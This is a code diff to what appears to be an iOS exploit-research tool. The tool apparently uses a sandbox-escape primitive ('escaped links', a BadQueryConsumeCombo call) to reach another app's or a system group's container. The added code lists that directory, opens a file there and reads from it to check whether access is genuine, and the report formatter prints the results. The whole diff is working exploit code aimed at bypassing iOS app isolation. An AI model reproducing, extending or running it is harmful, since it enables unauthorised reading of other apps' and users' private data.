@@ -647,6 +647,20 @@ static NSString *buildTextReport(NSDictionary *report)
                     entry[@"ExtensionClass"] ?: (entry[@"Status"] ?: @"?")];
             }
         }
+        NSDictionary *dp = [writeProbe[@"DataProtectionProbe"] isKindOfClass:NSDictionary.class]
+            ? writeProbe[@"DataProtectionProbe"] : nil;
+        if (dp) {
+            [text appendString:@"Data Protection diagnosis:\n"];
+            [text appendFormat:@"  ProtectedDataAvailable: %@\n", dp[@"ProtectedDataAvailable"]];
+            [text appendFormat:@"  Container             : %@\n", dp[@"Container"] ?: @"-"];
+            [text appendFormat:@"  Readdir               : %@\n", dp[@"Readdir"]];
+            [text appendFormat:@"  EntriesScanned        : %@\n", dp[@"EntriesScanned"] ?: @"-"];
+            [text appendFormat:@"  NoRegularFiles        : %@\n", dp[@"NoRegularFiles"] ?: @"-"];
+            [text appendFormat:@"  FirstFile             : %@\n", dp[@"FirstFile"] ?: @"-"];
+            [text appendFormat:@"  OpenOK/Errno          : %@/%@\n",
+                dp[@"OpenOK"], dp[@"OpenErrno"] ?: @"-"];
+            [text appendFormat:@"  ReadOK                : %@\n", dp[@"ReadOK"] ?: @"-"];
+        }
     }
 
     [text appendString:@"\n--- [7] Full step log ---\n"];
@@ -1576,6 +1590,97 @@ static NSMutableDictionary *runWriteProbe(void)
         [tokenTypes addObject:entry];
     }
     result[@"TokenTypes"] = tokenTypes;
+
+    // 7) Data Protection diagnosis: device lock state + file-level read test
+    // on a REAL other-app container (not our own). Distinguishes:
+    //   - readdir lists dirs but files are hidden       -> DP filter
+    //   - readdir lists files but open() fails EPERM    -> DP locked (or MAC)
+    //   - file opens and reads                          -> genuine access
+    NSMutableDictionary *dpProbe = [NSMutableDictionary dictionary];
+    BOOL protectedAvailable = [UIApplication sharedApplication].isProtectedDataAvailable;
+    dpProbe[@"ProtectedDataAvailable"] = @(protectedAvailable);
+    logStep(protectedAvailable, @"data protection",
+        protectedAvailable ? @"protected data available (unlocked)" : @"LOCKED - files will be hidden");
+
+    // Find a real other-app container via the escaped links.
+    NSString *escapedAppData = [[probeRoot() stringByAppendingPathComponent:kBadQueryDirectoryName]
+        stringByAppendingPathComponent:@"App Data"];
+    NSString *otherContainer = nil;
+    NSArray<NSString *> *links = [[NSFileManager defaultManager]
+        contentsOfDirectoryAtPath:escapedAppData error:nil];
+    for (NSString *name in links ?: @[]) {
+        NSString *linkPath = [escapedAppData stringByAppendingPathComponent:name];
+        struct stat st = {0};
+        if (lstat(linkPath.fileSystemRepresentation, &st) != 0 || !S_ISLNK(st.st_mode)) continue;
+        char target[PATH_MAX] = {0};
+        ssize_t n = readlink(linkPath.fileSystemRepresentation, target, sizeof(target) - 1);
+        if (n > 0) {
+            target[n] = '\0';
+            otherContainer = [NSString stringWithUTF8String:target];
+            dpProbe[@"Container"] = otherContainer;
+            break;
+        }
+    }
+    if (!otherContainer) {
+        // Fallback: the MobileGestalt cache dir (system group, known reachable).
+        otherContainer = @"/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches";
+        dpProbe[@"Container"] = otherContainer;
+        dpProbe[@"Fallback"] = @YES;
+    }
+    if (otherContainer) {
+        int64_t h = BadQueryConsumeCombo(otherContainer,
+            @"systemgroup.com.apple.mobilegestaltcache", 0x900000000ULL, 0, YES);
+        dpProbe[@"Handle"] = @(h);
+        if (h >= 0) {
+            DIR *dir = opendir(otherContainer.UTF8String);
+            if (dir) {
+                dpProbe[@"Readdir"] = @YES;
+                NSString *firstFile = nil;
+                NSUInteger scanned = 0;
+                struct dirent *de;
+                while ((de = readdir(dir)) != NULL && scanned < 200) {
+                    if (!strcmp(de->d_name, ".") || !strcmp(de->d_name, "..")) continue;
+                    scanned++;
+                    NSString *child = [otherContainer stringByAppendingPathComponent:
+                        [NSString stringWithUTF8String:de->d_name]];
+                    struct stat cs = {0};
+                    if (lstat(child.fileSystemRepresentation, &cs) == 0 && S_ISREG(cs.st_mode)) {
+                        firstFile = child;
+                        break;
+                    }
+                }
+                closedir(dir);
+                dpProbe[@"EntriesScanned"] = @(scanned);
+                if (firstFile) {
+                    dpProbe[@"FirstFile"] = firstFile;
+                    errno = 0;
+                    int fd = open(firstFile.UTF8String, O_RDONLY | O_CLOEXEC | O_NOFOLLOW);
+                    dpProbe[@"OpenOK"] = @(fd >= 0);
+                    dpProbe[@"OpenErrno"] = @(fd >= 0 ? 0 : errno);
+                    logStep(fd >= 0, @"other-container file open",
+                        fd >= 0 ? firstFile : [NSString stringWithFormat:@"%@ errno=%d (%s)",
+                            firstFile, errno, strerror(errno)]);
+                    if (fd >= 0) {
+                        uint8_t byte = 0;
+                        ssize_t r = read(fd, &byte, 1);
+                        dpProbe[@"ReadOK"] = @(r == 1);
+                        logStep(r == 1, @"other-container file read", r == 1 ? @"read byte" : @"read failed");
+                        close(fd);
+                    }
+                } else {
+                    dpProbe[@"NoRegularFiles"] = @YES;
+                    logStep(NO, @"other-container files",
+                        scanned > 0 ? @"readdir lists dirs but NO regular files (DP filter?)"
+                                    : @"readdir returned nothing");
+                }
+            } else {
+                dpProbe[@"Readdir"] = @NO;
+                dpProbe[@"ReaddirErrno"] = @(errno);
+                logStep(NO, @"other-container opendir", [NSString stringWithFormat:@"errno=%d", errno]);
+            }
+        }
+    }
+    result[@"DataProtectionProbe"] = dpProbe;
 
     logLine(@"==== write capability probe done ====");
     return result;
